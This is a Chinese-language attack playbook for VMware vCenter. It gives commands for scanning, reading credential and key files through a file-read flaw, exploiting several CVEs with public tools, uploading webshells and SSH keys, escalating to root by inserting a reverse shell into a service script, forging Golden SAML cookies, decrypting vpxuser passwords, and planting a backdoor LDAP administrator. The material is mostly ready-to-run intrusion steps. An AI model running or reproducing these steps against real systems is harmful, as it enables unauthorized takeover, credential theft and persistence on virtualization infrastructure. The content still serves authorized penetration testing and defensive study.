# vCenter攻击面

[TOC]

## 信息收集

### SOAP版本探测

- 使用**nuclei**扫描目标**vCenter**版本信息

```shell
nuclei.exe -t nuclei-templates\http\technologies\vmware\vmware-detect.yaml -l host.list
```

### 任意文件读取

- 使用**nuclei**扫描目标查看是否存在**任意文件读取**漏洞

```shell
# Windows POC 如下
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-lfi.yaml -l host.list
# Linux POC 如下
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-lfi-linux.yaml -l host.list
```

#### PSQL数据库凭据泄露

- 访问目标服务器**vcdb.properties**获取**数据库账号密码**等敏感信息

```shell
# Windows 访问
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
# Linux 访问
https://<目标IP>/eam/vib?id=/etc/vmware-vpx/vcdb.properties
```

#### vCenter备份文件泄露

- 获取**data.mdb**（用于制作Golden SAML）

```shell
# Windows 访问
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
# Linux 访问
https://<目标IP>/eam/vib?id=/storage/db/vmware-vmdir/data.mdb
```

#### 密钥文件泄露

- 获取**symkey.dat**（用于利用CVE-2022-22948漏洞）

```shell
# Windows 访问
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
# Linux 访问
https://<目标IP>/eam/vib?id=/etc/vmware-vpx/ssl/symkey.dat
```

## 漏洞利用

### CVE-2021-21985

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-21985**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-21985.yaml -l host.list
```

- 使用**VcenterKiller**利用**CVE-2021-21985**漏洞

```shell
.\vckiller_windows_amd64.exe -u https://<目标IP> -m 21985 -c whoami
```

### CVE-2021-22005

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-22005**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-22005.yaml -l host.list
```

- 使用**cve-2021-22005-exp**利用**CVE-2021-22005**漏洞

```shell
python3 exp.py -t https://<目标IP>/ -s shell.jsp
```

- 显示**phAsyncTaskExecutor-5  WARN  root**即上传webshell成功

```shell
curl --insecure https://<目标IP>/idm/..;/<webshell文件名>.jsp
```

### log4j2 JNDI注入

- 使用**nuclei**扫描目标查看是否存在**log4j2 JNDI注入**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-log4j-jndi-rce.yaml -l host.list
```

- 使用**VcenterKiller**利用**log4j2 JNDI注入**漏洞

```shell
.\vckiller_windows_amd64.exe -u https://<目标IP> -m log4center -t exec -c whoami
```

### Provider-SSRF

- 使用**nuclei**扫描目标查看是否存在**Provider-SSRF**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-ssrf.yaml -l host.list
```

### CVE-2021-21972

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-21972**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-21972.yaml -l host.list
```

#### 上传webshell

- 使用**CVE-2021-21972**上传**webshell**

```shell
python3 CVE-2021-21972.py -url https://<目标IP>
```

- 查看是否上传成功

```
curl --insecure https://<目标IP>/ui/resources/shell.jsp
```

#### 上传ssh公钥

- 使用**VcenterKiller**上传**ssh公钥**

```shell
./vckiller_linux_amd64 -u https://<目标IP> -m 21972 -f .ssh/id_rsa.pub -t ssh
```

### CVE-2019-5544

- 使用**check_slp**探测**CVE-2019-5544**漏洞

```shell
python3 check_slp.py host.list
```

### CVE-2020-3992

- 使用**check_slp**探测**CVE-2020-3992**漏洞

```shell
python3 check_slp.py host.list
```

### CVE-2021-21994

//TODO

## 权限提升

### vsphere-ui权限提升（CVE-2021-22015）

- 查看**java-wrapper-vmon**是否属于用户组**cis**

```shell
cat /usr/lib/vmware-vmon/java-wrapper-vmon
```

- 查看**vsphere-ui**是否具有**cis**用户组权限

```shell
cat /etc/group|grep cis
```

- 把**恶意代码**写入**java-wrapper-vmon**脚本，如：反弹shell、写入root权限的webshell
- 重启服务即可获取**root权限**

```shell
service-control --start --all
```

## 权限获取

### Golden SAML

- 获取**data.mdb**

```shell
# Windows 访问
C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
# Linux 访问
/storage/db/vmware-vmdir/data.mdb
```

- 使用**vcenter_saml_login**创建**COOKIE**

```shell
python3 vcenter_saml_login.py -p data.mdb -t <vCenter服务器IP>
```

- 打开**火狐浏览器**，使用**hackbar**，设置**COOKIE**，即可登陆**vCenter后台**

### 标识凭据窃取（CVE-2022-22948）

- 查看**数据库凭据**信息

```shell
# linux
cat /etc/vmware-vpx/vcdb.properties
# windows
type  C:\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties
```

- 获取**vpxuser**用户密码的**密文**

  - **psql**数据库

  ```shell
  psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c "select ip_address,user_name,password from vpx_host;"
  ```

  - **mssql**数据库

  ```shell
  sqlmap -d mssql://<用户>:<密码>@<IP:PORT>/VCDB --batch -D VCDB -T VPX_HOST -C "IP_ADDRESS,USER_NAME,PASSWORD" --dump
  ```

  - 密文格式必须严格按照下方格式：ip前后只允许一个空格，密文前一个空格，密文后不允许空格

  ```
    ip_address   | user_name |                                         password                                          
  ---------------+-----------+-------------------------------------------------------------------------------------------
   192.168.24.81 | vpxuser   | *Sijef7ou82MqEDfYVx3KtaJYZctrodsUJJELnzHawTdkhWmxumDa2mh7l1eKasT0/Lnv8CfutQWEDGYgta70xw==
  ```

  - 获取密钥**symkey.dat**

```shell
# linux
cat /etc/vmware-vpx/ssl/symkey.dat
# windows
type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
```

- 使用**vhost_password_decrypt**解密**vpxuser**用户**密码**

```shell
python decrypt.py symkey.dat password.enc password.txt
```

## 权限维持

### LDAP新增用户

- 使用**vCenterLDAP_Manage**新增**用户**（PS：需要交互式shell）
  - 新增**username**：`secadmin`
  - 新增**dn**：`cn=secadmin,cn=Users,dc=vsphere,dc=local`
  - 新增**userPrincipalName**：`secadmin@vsphere.local`

```shell
python3 vCenterLDAP_Manage.py adduser
```

- 新增用户后默认密码为**P@ssWord123@@**
- 检测是否成功添加**用户**

```shell
python3 vCenterLDAP_Manage.py getuser
```

- 为secadmin添加**管理员**权限
  - 添加**user dn**：`cn=secadmin,cn=Users,dc=vsphere,dc=local`

```shell
python3 vCenterLDAP_Manage.py addadmin
```

- 检测是否成功添加**管理员**权限

```shell
python3 vCenterLDAP_Manage.py getadmin
```

- 使用用户**secadmin@vsphere.local**和密码**P@ssWord123@@**登陆vCenter后台即可

### 强制重置用户密码

- 使用**vmafd-cli**查询域名

```shell
/usr/lib/vmware-vmafd/bin/vmafd-cli get-domain-name --server-name localhost
```

- 使用**vdcadmintool**重置**Administrator**用户密码
  - 输入用户名：`Administrator@vsphere.local`

```shell
/usr/lib/vmware-vmdir/bin/vdcadmintool
```

# 鸣谢

- [**nuclei**](https://github.com/projectdiscovery/nuclei)
- [**nuclei-templates**](https://github.com/projectdiscovery/nuclei-templates)
- [**VcenterKiller**](https://github.com/Schira4396/VcenterKiller)
- [**cve-2021-22005-exp**](https://github.com/shmilylty/cve-2021-22005-exp)
- [**CVE-2021-21972**](https://github.com/NS-Sp4ce/CVE-2021-21972)
- [**check_slp**](https://github.com/HynekPetrak/CVE-2019-5544_CVE-2020-3992)
- [**vcenter_saml_login**](https://github.com/horizon3ai/vcenter_saml_login)
- [**vhost_password_decrypt**](https://github.com/shmilylty/vhost_password_decrypt)
- [**vCenterLDAP_Manage**](https://github.com/3gstudent/Homework-of-Python/blob/master/vCenterLDAP_Manage.py)
